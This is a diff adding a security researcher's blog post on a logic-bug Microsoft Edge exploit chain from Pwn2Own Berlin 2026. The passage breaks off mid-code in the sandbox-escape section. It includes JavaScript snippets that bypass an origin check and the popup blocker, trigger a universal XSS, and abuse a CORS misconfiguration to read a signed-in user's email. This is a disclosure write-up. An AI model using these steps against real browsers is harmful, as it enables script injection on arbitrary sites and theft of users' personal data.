@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+
+    
+      <meta name="description" content="This is what I built for Pwn2Own Berlin 2026 — a completely handmade, logic-only Microsoft Edge Full Chain, with no memory corruption, and no AI at all! 🔥">
+<meta property="og:type" content="article">
+<meta property="og:title" content="The Last Proof of Human Craft: Forging a Microsoft Edge Full Chain with Logic Bugs Only!">
+<meta property="og:url" content="https://blog.orange.tw/posts/2026-10-the-last-proof-of-human-craft-browser-full-chain/index.html">
+<meta property="og:site_name" content="Orange Tsai">
+<meta property="og:description" content="This is what I built for Pwn2Own Berlin 2026 — a completely handmade, logic-only Microsoft Edge Full Chain, with no memory corruption, and no AI at all! 🔥">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.orange.tw/posts/2026-10-the-last-proof-of-human-craft-browser-full-chain/pwnie-award-2026.webp">
+<meta property="og:image" content="https://blog.orange.tw/posts/2026-10-the-last-proof-of-human-craft-browser-full-chain/ba80963f-b4cb-4268-8c07-85b91cf4fa28.png">
+<meta property="og:image" content="https://blog.orange.tw/posts/2026-10-the-last-proof-of-human-craft-browser-full-chain/2026-10-27_125828.png">
+<meta property="og:image" content="https://blog.orange.tw/posts/2026-10-the-last-proof-of-human-craft-browser-full-chain/1b103d19-bad0-4449-9c1c-d207bce67376.webp">
+<meta property="og:image" content="https://blog.orange.tw/posts/2026-10-the-last-proof-of-human-craft-browser-full-chain/2026-10-28_153010.png">
+<meta property="og:image" content="https://blog.orange.tw/posts/2026-10-the-last-proof-of-human-craft-browser-full-chain/a_slide1_smooth.svg">
+<meta property="article:published_time" content="2026-10-26T04:58:51.000Z">
+<meta property="article:modified_time" content="2026-10-28T09:16:25.831Z">
+<meta property="article:author" content="Orange Tsai">
+<meta property="article:tag" content="Hacker, Security, Vulnerability, Web, RCE, SSRF, XSS, CVE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.orange.tw/posts/2026-10-the-last-proof-of-human-craft-browser-full-chain/pwnie-award-2026.webp">
+    
+
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    
+      <title>The Last Proof of Human Craft: Forging a Microsoft Edge Full Chain with Logic Bugs Only! | Orange Tsai</title><meta name="robots" content="noindex">
+    
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-13047966-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-13047966-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Orange Tsai" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4 ">
+        
+          <header id="header">
+  
+  
+    
+      <img id="logo" alt class="u-logo" src="/images/logo.png" />
+    
+  
+    <div id="title">
+      <a class="u-url u-uid" href="/"> <h1 class="p-name">Orange Tsai</h1> </a>
+    </div>
+  
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
+      </li>
+      <!--
+     --><li><a href="/">Home</a></li><!--
+   --><!--
+     --><li><a href="/articles/">Articles</a></li><!--
+   --><!--
+     --><li><a href="/talks/">Talks</a></li><!--
+   --><!--
+     --><li><a href="/about/">About</a></li><!--
+   -->
+    </ul>
+  </div>
+</header>
+
+        
+
+        
+          <hr style='margin: 0px; margin-bottom: 32px; border: 0.5px solid #ccc; '>
+        
+
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        The Last Proof of Human Craft: Forging a Microsoft Edge Full Chain with Logic Bugs Only!
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">🍊 <a href='/about'>Orange Tsai</a></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-10-26T04:58:51.000Z" class="dt-published" itemprop="datePublished">2026-10-26</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>I think I should still dump some of my work once in a while, even though it feels like fewer and fewer people actually sit down and read articles these days (or maybe now they all leave it to their agents XD). Anyway, this is what I built for Pwn2Own Berlin 2026 — a completely handmade, logic-only Microsoft Edge Full Chain, with no memory corruption, and no AI at all! 🔥</p>
+<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Confirmed! Orange Tsai (@orange_8361) of DEVCORE Research Team (@d3vc0r3) chained 4 logic bugs to achieve a sandbox escape on Microsoft Edge, earning $175,000 and 17.5 Master of Pwn points. Full win! #Pwn2Own #P2OBerlin https://t.co/vJaIpGG4cD</p>&mdash; TrendAI Zero Day Initiative (@thezdi) <a target="_blank" rel="noopener" href="https://x.com/thezdi/status/2054868495888777266?ref_src=twsrc%5Etfw">May 14, 2026</a></blockquote>
+<script async src="https://platform.x.com/widgets.js" charset="utf-8"></script>
+
+<br>
+
+<p>The whole chain is made up of five bugs and two Windows features. I have also shared the whole bug-hunting and chaining process at this year’s HITCON and Hexacon, plus some fun stories along the way. You can check <a target="_blank" rel="noopener" href="https://github.com/orangetw/My-Presentation-Slides/blob/main/data/2026-The-Last-Proof-of-Human-Craft-en.pdf">the slides here</a>!</p>
+<p>Also, maybe everyone thinks LLMs can already pwn everything in the AI era, so something made entirely by hand somehow feels a bit more precious. That might also be why this chain was nominated for this year’s Pwnie Awards and won the Epic Achievement award. 🎉</p>
+<p><img src="/posts/2026-10-the-last-proof-of-human-craft-browser-full-chain/pwnie-award-2026.webp" alt="pwnie-award-2026" title="w60"></p>
+<h1 id="Let’s-Navigate"><a href="#Let’s-Navigate" class="headerlink" title="Let’s Navigate!"></a>Let’s Navigate!</h1><p>So where do we start with a logic-only full chain? Well, since it’s a “browser,” let’s start by looking at how “browsing” (or what Chromium calls “navigation”) works. I won’t go into too much detail in this post, because I think in this era, you can just ask your agents to fill in the details :)</p>
+<p>But I’d still recommend reading “<a target="_blank" rel="noopener" href="https://docs.google.com/presentation/d/1YVqDmbXI0cllpfXD7TuewiexDNZYfwk6fRdmoXJbBlM/edit">Life of a Navigation</a>“ from Chrome University if you want to get the full picture.</p>
+<h2 id="The-Forgotten-Navigation-Throttles"><a href="#The-Forgotten-Navigation-Throttles" class="headerlink" title="The Forgotten Navigation Throttles"></a>The Forgotten Navigation Throttles</h2><p>While I was walking through the Chromium Navigation flow, something called “Navigation Throttles” caught my attention. They live in the Browser Process, and intercept all navigation requests initiated by either the Browser or the Renderer. Maybe it’s easy to say this in hindsight, but out of the 3,000+ CVEs Google Chrome has fixed over the past five years, there are only fewer than 20 related to them. So I guess this is also a corner not too many people pay attention to. </p>
+<p>Anyway, I started digging into the Navigation Throttles, and checked how Google Chrome and Microsoft Edge implemented them. And while going through the code, I found that Edge has a throttle called <code>EdgeCAGuidanceNavigationThrottle</code> for its enterprise Entra ID feature (the <code>CA</code> here stands for <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/entra/identity/conditional-access/overview">Conditional Access</a>). The purpose of this throttle is to guide users to the right User Profile when Edge detects them signing in with a work account on a Microsoft website. And to fire this throttle, you have to start a navigation from a specific Microsoft-owned origin, such as <code>login.live.com</code>:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.<span class="property">href</span> = <span class="string">`https://guidance-ca-error/?email=&#123;email&#125;&amp;switch_profile=&#123;url&#125;`</span></span><br></pre></td></tr></table></figure>
+
+<p>And once the throttle is fired, Edge would compare the email of the current User Profile with <code>?email=&#123;email&#125;</code>. If they don’t match, Edge pops up a dialog guiding you to switch accounts.</p>
+<p><img src="/posts/2026-10-the-last-proof-of-human-craft-browser-full-chain/ba80963f-b4cb-4268-8c07-85b91cf4fa28.png" alt="image" title="w60"></p>
+<br>
+
+
+<p>But if they do match, Edge would then grab the URL you were originally heading to from <code>switch_profile=&#123;url&#125;</code>, and launch a new navigation with Chromium’s internal Navigation API:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NavigateParams <span class="title">params</span><span class="params">(browser, switch_profile_url, ui::PAGE_TRANSITION_LINK)</span></span>;</span><br><span class="line">params.disposition = WindowOpenDisposition::CURRENT_TAB;</span><br><span class="line">params.window_action = NavigateParams::SHOW_WINDOW;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Navigate</span>(&amp;params);</span><br></pre></td></tr></table></figure>
+
+<p>So basically, the throttle cancels the original navigation when the target URL matches a specific internal format, and then launches a new one with the URL from the attacker-controlled Query String, if the conditions are met. Since this new navigation is initiated by the Browser Process, in theory we can do a few things we couldn’t do before, such as jumping to normally prohibited pages like <code>edge://settings</code> or <code>devtools://...</code>, or even pseudo-schemes like <code>javascript:alert(origin)</code>.</p>
+<p>Though the JavaScript pseudo-scheme sounds like a powerful primitive, you still need to obtain the Execution Context on <code>login.live.com</code> to fire the throttle in the first place. So being able to jump to <code>javascript:</code> doesn’t really give you any extra capability. At most, it’s just like a Self-XSS, or a way to turn an Open Redirect there into XSS. Either way, you’re still only executing JavaScript in the same <code>login.live.com</code> context.</p>
+<p>Honestly, I didn’t take this bug too seriously at first glance. To me, it was just a stronger Open Redirect that could jump to a few more Browser-Level Schemes, and still needed to be chained with other bugs. So the bug just sat in my notes for weeks… 🤦‍♂️</p>
+<h2 id="Sourceless-Navigation-A-New-UXSS-Primitive"><a href="#Sourceless-Navigation-A-New-UXSS-Primitive" class="headerlink" title="Sourceless Navigation: A New UXSS Primitive"></a>Sourceless Navigation: A New UXSS Primitive</h2><p>The turning point was when I was going over the Chromium architecture one day and started thinking: The throttle is handled in the Browser Process, so the new navigation is initiated from the browser as well. However, the page we fired the throttle from, <code>login.live.com</code>, lives in the Renderer, and while investigating the logic, I couldn’t find any code tying the Browser and Renderer together. So… <code>CURRENT_TAB</code> refers to which tab, exactly?</p>
+<p>To find this out, I ran a quick test and added a delay to the original trigger:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    location.<span class="property">href</span> = <span class="string">`https://guidance-ca-error/?email=&#123;email&#125;&amp;switch_profile=&#123;url&#125;`</span></span><br><span class="line">&#125;, <span class="number">8000</span>)</span><br></pre></td></tr></table></figure>
+
+
+<p>And during the delay, we manually switched the Edge to a new tab to see what would happen, and…</p>
+<p><video src="./Video_2026-08-14_193248_countdown.mp4" autoplay muted loop playsinline preload="metadata" style="display:block;max-width:100%;height:auto;"></video></p>
+<br>
+
+<p>Boom! We got a UXSS on <code>google.com</code>, and that’s also the first bug of the whole chain. To fully understand the UXSS root cause, we dug into Chromium’s source code. We found that if <code>Navigate()</code> is called without specifying the <code>source_contents</code> (the Renderer source to bind to), Chromium would use the current active tab as the Renderer source automatically.</p>
+<p><em>↓ <strong>Path:</strong> <a target="_blank" rel="noopener" href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/148.0.7778.97:chrome/browser/ui/browser_navigator.cc">chromium&#x2F;chrome&#x2F;browser&#x2F;ui&#x2F;browser_navigator.cc</a></em></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">base::WeakPtr&lt;content::NavigationHandle&gt; <span class="title">Navigate</span><span class="params">(NavigateParams* params)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// If no source WebContents was specified, we use the selected one from the</span></span><br><span class="line">  <span class="comment">// target browser. This must happen before GetBrowserAndTabForDisposition()</span></span><br><span class="line">  <span class="comment">// has a chance to replace |params-&gt;browser| with another one, but after the</span></span><br><span class="line">  <span class="comment">// above check that relies on the original source_contents value.</span></span><br><span class="line">  <span class="keyword">if</span> (!params-&gt;source_contents &amp;&amp; params-&gt;browser) &#123;</span><br><span class="line">    params-&gt;source_contents = params-&gt;browser</span><br><span class="line">                  -&gt;<span class="built_in">GetBrowserForMigrationOnly</span>()</span><br><span class="line">                  -&gt;<span class="built_in">tab_strip_model</span>()</span><br><span class="line">                  -&gt;<span class="built_in">GetActiveWebContents</span>(); <span class="comment">// &lt;--- [1] Use the active tab as the navigation source</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// If no target WebContents was specified (and we didn&#x27;t seek and find a</span></span><br><span class="line">  <span class="comment">// singleton), we need to construct one if we are supposed to target a new</span></span><br><span class="line">  <span class="comment">// tab.</span></span><br><span class="line">  <span class="keyword">if</span> (!contents_to_navigate_or_insert) &#123;</span><br><span class="line">    <span class="built_in">DCHECK</span>(!params-&gt;url.<span class="built_in">is_empty</span>());</span><br><span class="line">    <span class="keyword">if</span> (params-&gt;disposition != WindowOpenDisposition::CURRENT_TAB) &#123;</span><br><span class="line">      <span class="comment">// [...]</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// ... otherwise if we&#x27;re loading in the current tab, the target is the</span></span><br><span class="line">      <span class="comment">// same as the source.</span></span><br><span class="line">      <span class="built_in">DCHECK</span>(params-&gt;source_contents);</span><br><span class="line">      contents_to_navigate_or_insert = params-&gt;source_contents;   <span class="comment">// &lt;--- [2] Set it as the target WebContents</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Try to handle non-navigational URLs that popup dialogs and such, these</span></span><br><span class="line">    <span class="comment">// should not actually navigate.</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">HandleNonNavigationAboutURL</span>(</span><br><span class="line">            params-&gt;url, contents_to_navigate_or_insert-&gt;<span class="built_in">GetBrowserContext</span>())) &#123;</span><br><span class="line">      <span class="comment">// Perform the actual navigation, tracking whether it came from the</span></span><br><span class="line">      <span class="comment">// renderer.</span></span><br><span class="line">      NavigationController::LoadURLParams load_url_params =</span><br><span class="line">          <span class="built_in">LoadURLParamsFromNavigateParams</span>(contents_to_navigate_or_insert,</span><br><span class="line">                                          params);</span><br><span class="line">      navigation_handle =</span><br><span class="line">          contents_to_navigate_or_insert-&gt;<span class="built_in">GetController</span>().<span class="built_in">LoadURLWithParams</span>(</span><br><span class="line">              load_url_params);     <span class="comment">// &lt;--- [3] Start navigation; dispatch Mojo downstream</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Though the code path requires <code>params.disposition</code> to be <code>CURRENT_TAB</code> and <code>params.source_contents</code> to be <code>NULL</code>, luckily, those are the defaults, so even Chromium’s own <a target="_blank" rel="noopener" href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/148.0.7778.97:chrome/browser/ui/browser_navigator_params.h;l=54">example code</a> gets this wrong. I guess this should count as a new UXSS attack surface!</p>
+<h2 id="The-0-Click-Challenges"><a href="#The-0-Click-Challenges" class="headerlink" title="The 0-Click Challenges"></a>The 0-Click Challenges</h2><p>The UXSS primitive we just got sounds great, but firing that still comes with quite a few challenges in practice. Here we list four we faced while weaponizing the UXSS, and how we cracked them with more and more bugs 😉. </p>
+<h3 id="1-The-Throttle-Must-Be-Fired-from-a-Trusted-Origin"><a href="#1-The-Throttle-Must-Be-Fired-from-a-Trusted-Origin" class="headerlink" title="1. The Throttle Must Be Fired from a Trusted Origin"></a>1. The Throttle Must Be Fired from a Trusted Origin</h3><p>The first challenge, as we mentioned earlier: this UXSS has to be fired from certain Microsoft sites. Though we could still find an XSS there to make that happen, that sounds like a painful job, so we’d keep it as a last resort. Instead, we decided to see if there was any low-hanging fruit in the origin check first.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">content::WebContents* web_contents = <span class="built_in">navigation_handle</span>()-&gt;<span class="built_in">GetWebContents</span>();</span><br><span class="line"><span class="type">const</span> GURL last_committed_url = web_contents-&gt;<span class="built_in">GetLastCommittedURL</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">IsSupportedLoginUrl</span>(last_committed_url) )</span><br><span class="line">    <span class="keyword">return</span> content::NavigationThrottle::CANCEL_AND_IGNORE;</span><br></pre></td></tr></table></figure>
+
+<p>We found that <code>EdgeCAGuidanceNavigationThrottle</code> uses <code>GetLastCommittedURL()</code> to retrieve the origin that fired the navigation, and then check it. At first glance, this looks like the correct way to do the validation. But take a second look, and you’ll notice Microsoft seems to have forgotten that a navigation can come not just from the current <code>WebContents</code>, but also from another window… So a simple <code>window.open(...)</code> is enough to bypass it!</p>
+<p><em>↓ You can run this on any website to fire the throttle</em></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">popup = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;https://login.live.com/&#x27;</span>, <span class="string">&#x27;_blank&#x27;</span>)</span><br><span class="line">popup.<span class="property">location</span> = <span class="string">`https://guidance-ca-error/?email=&#123;email&#125;&amp;switch_profile=&#123;url&#125;`</span> </span><br></pre></td></tr></table></figure>
+
+
+<h3 id="2-The-Popup-Blocker"><a href="#2-The-Popup-Blocker" class="headerlink" title="2. The Popup Blocker"></a>2. The Popup Blocker</h3><p>So far, we can bypass the origin check with a cross-window navigation. However, modern browsers don’t let webpages open new windows that easily nowadays, so here comes another new problem: the <a target="_blank" rel="noopener" href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/148.0.7778.97:components/blocked_content/popup_blocker.cc">Popup Blocker</a> would block <code>window.open(...)</code> by default.</p>
+<p><img src="/posts/2026-10-the-last-proof-of-human-craft-browser-full-chain/2026-10-27_125828.png" alt="popup-blocker"></p>
+<p>To crack this, we kept reversing Microsoft Edge. And we found Microsoft, maybe for internal use, made its own hardcoded whitelist for popups… So a popup like the following would normally be blocked as expected:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popup = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;https://malicious.tld&#x27;</span>, <span class="string">&#x27;_blank&#x27;</span>)      <span class="comment">// blocked</span></span><br></pre></td></tr></table></figure>
+
+<p>But if you swap the URL for the whitelisted one… the window just appears. And then remember to navigate it back to the original site, and you’ve bypassed the Popup Blocker!</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">popup = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;about:blank#quickAuthPopup&#x27;</span>, <span class="string">&#x27;_blank&#x27;</span>) <span class="comment">// granted</span></span><br><span class="line">popup.<span class="property">location</span> = <span class="string">&#x27;https://malicious.tld&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>Thank you, Microsoft!</p>
+<p><img src="/posts/2026-10-the-last-proof-of-human-craft-browser-full-chain/1b103d19-bad0-4449-9c1c-d207bce67376.webp" alt="thanks-microsoft" title="w60"></p>
+<h3 id="3-The-Need-for-a-Signed-In-Profile"><a href="#3-The-Need-for-a-Signed-In-Profile" class="headerlink" title="3. The Need for a Signed-In Profile"></a>3. The Need for a Signed-In Profile</h3><p>Now that we can fire <code>EdgeCAGuidanceNavigationThrottle</code> from wherever we want, the next step is to get past the Conditional Access checks. The code first requires Microsoft Edge to already have a signed-in User Profile, and then checks if <code>?email=&#123;email&#125;</code> matches the profile’s email. Both conditions have to be met before we reach the sourceless, browser-initiated navigation to finally trigger our UXSS primitive.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Profile* current_profile = Profile::<span class="built_in">FromBrowserContext</span>(</span><br><span class="line">    web_contents-&gt;<span class="built_in">GetBrowserContext</span>());</span><br><span class="line"></span><br><span class="line">std::string email;</span><br><span class="line">net::<span class="built_in">GetValueForKeyInQuery</span>(target_url, kEmailQueryKey, &amp;email);</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> base::FilePath target_profile_path = <span class="built_in">GetPathOfProfileWithEmail</span>(email);</span><br><span class="line"><span class="keyword">if</span> (current_profile-&gt;<span class="built_in">GetPath</span>() != target_profile_path) &#123;</span><br><span class="line">    profiles::<span class="built_in">SwitchToProfile</span>(target_profile_path, <span class="literal">false</span>, <span class="built_in">BindOnce</span>(…));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>However, since we can’t assume the target environment has a signed-in profile in advance, we still need to find a way to make the attack work even if it doesn’t. While exploring Microsoft Edge, we came across a great feature called “OneAuth”. The feature lets any Edge WebView application automatically sign in with your current MSA credentials when visiting Microsoft-owned sites. And it turns out that starting with 25H2, <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/customize-oobe-in-windows-11">Windows OOBE</a> requires you to sign in with an MSA (unless you use the local-account workaround). So even if you’ve never created a User Profile in the browser, just visiting <code>www.microsoft.com</code> is enough for Edge to create one and sign you in automatically.</p>
+<p>Thanks again, Microsoft!</p>
+<p><video src="./Video_2026-10-27_132504_login_status_redacted_blog.mp4" autoplay muted loop playsinline preload="metadata" style="display:block;max-width:100%;height:auto;"></video></p>
+<br>
+
+<h3 id="4-The-Need-for-Prior-Knowledge-of-the-Login-Email"><a href="#4-The-Need-for-Prior-Knowledge-of-the-Login-Email" class="headerlink" title="4. The Need for Prior Knowledge of the Login Email"></a>4. The Need for Prior Knowledge of the Login Email</h3><p>With the sign-in issue cracked, the last challenge is to get the victim’s email in advance. Of course, we could try some social engineering, or keep reversing Microsoft Edge to find another bug that leaks that for us. But since the automatic sign-in already sets several Microsoft cookies, we thought Web Hacking would be an easier way to steal the email. So we fired up Burp Suite and started looking for web vulnerabilities.</p>
+<p>We spent a few hours and found several XSS bugs on Microsoft sites. While poking around, I noticed that <code>assets.msn.com</code>, which is embedded in <code>edge://new-tab-page-online</code>, returns the currently signed-in user’s email. And even more interesting, when I checked the response header, the site seemed to have a CORS misconfiguration… </p>
+<p><img src="/posts/2026-10-the-last-proof-of-human-craft-browser-full-chain/2026-10-28_153010.png" alt="cors-misconfig"></p>
+<p>So with a simple <code>fetch(...)</code> with credentials included, you can easily grab any Microsoft Edge user’s email from any website:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">resp = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`https://assets.msn.com/service/community/users/me?profile=social&amp;it=edgeid`</span>, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>, </span><br><span class="line">    <span class="attr">mode</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">    <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,</span><br><span class="line">    <span class="attr">referrerPolicy</span>: <span class="string">&#x27;no-referrer&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">body = <span class="keyword">await</span> resp.<span class="title function_">json</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>( body.<span class="property">value</span>[<span class="number">0</span>].<span class="property">email</span> )</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Putting-It-All-Together"><a href="#Putting-It-All-Together" class="headerlink" title="Putting It All Together!"></a>Putting It All Together!</h2><p>So far, to make this primitive work, we’ve chained together:</p>
+<ul>
+<li>A Trusted Origin bypass caused by a missing cross-window Opener check</li>
+<li>A Popup Blocker bypass caused by a hardcoded whitelist</li>
+<li>A OneAuth feature that automatically signs you in</li>
+<li>A CORS misconfiguration that lets us steal the signed-in user’s email</li>
+</ul>
+<p>Now we can finally trigger the UXSS without a single click! And even better, since this UXSS is initiated from the Browser Process (<code>HandleRendererDebugURL</code> in Mojo, if you’re interested), it can ignore any CSP entirely. That means we can run JavaScript on <code>google.com</code>, <code>facebook.com</code>, <code>icloud.com</code>, or whatever website we want!</p>
+<h1 id="Breaking-Out-of-the-Browser-Sandbox"><a href="#Breaking-Out-of-the-Browser-Sandbox" class="headerlink" title="Breaking Out of the Browser Sandbox"></a>Breaking Out of the Browser Sandbox</h1><p>So we have a Universal XSS. Does it mean that we can do whatever we want? If we’re talking about Web Security, then yes. But our goal here is to get ACE (Arbitrary Code Execution), so UXSS alone is far from enough. And we still need to find a way to break out of the Browser Sandbox to turn this UXSS into code execution.</p>
+<p>The first and most straightforward idea that came to my mind was: since we can run JavaScript on any website, or more precisely, any origin, why not just leverage privileged WebUI pages like <code>edge://settings</code> or <code>edge://downloads</code> to get ACE?</p>
+<p>This naive approach was of course already mitigated by the Chromium developers. In the Renderer’s Mojo handler, there’s an extra check: if the origin belongs to one of the following privileged WebUIs, the Renderer simply ignores the JavaScript URL.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">edge</span><br><span class="line">chrome-extension</span><br><span class="line">chrome</span><br><span class="line">chrome-untrusted</span><br><span class="line">chrome-distiller</span><br><span class="line">chrome-error</span><br><span class="line">chrome-native</span><br><span class="line">chrome-search</span><br><span class="line">devtools</span><br><span class="line"><span class="comment">// more...</span></span><br></pre></td></tr></table></figure>
+
+<p><em>↓ <strong>Path:</strong> <a target="_blank" rel="noopener" href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/148.0.7778.97:third_party/blink/renderer/core/frame/local_frame.cc">chromium&#x2F;third_party&#x2F;blink&#x2F;renderer&#x2F;core&#x2F;frame&#x2F;local_frame.cc</a></em></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">LocalFrame::LoadJavaScriptURL</span><span class="params">(<span class="type">const</span> KURL&amp; url)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Protect privileged pages against bookmarklets and other JavaScript</span></span><br><span class="line">  <span class="comment">// manipulations.</span></span><br><span class="line">  <span class="keyword">if</span> (SchemeRegistry::<span class="built_in">ShouldTreatURLSchemeAsNotAllowingJavascriptURLs</span>(</span><br><span class="line">          <span class="built_in">GetSecurityContext</span>()</span><br><span class="line">              -&gt;<span class="built_in">GetSecurityOrigin</span>()</span><br><span class="line">              -&gt;<span 